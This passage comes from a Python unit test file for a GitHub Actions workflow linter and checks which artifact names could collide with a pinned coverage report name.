            "          name: benchmark-results-${{ github.sha }}\n"
            "          path: out\n"
        )
        self.assertEqual(
            coverage_report_publish_violations(allowed, path=".github/workflows/other.yml"),
            [],
        )
        self.assertFalse(_could_be_pinned_report_name("${{ 'not-a-pinned-report' }}"))
        self.assertFalse(_could_be_pinned_report_name("benchmark-results-${{ github.sha }}"))
        self.assertTrue(_could_be_pinned_report_name("${{ 'coverage-xml' }}"))
        self.assertTrue(_could_be_pinned_report_name("${{ matrix.artifact }}"))


if __name__ == "__main__":
    unittest.main()
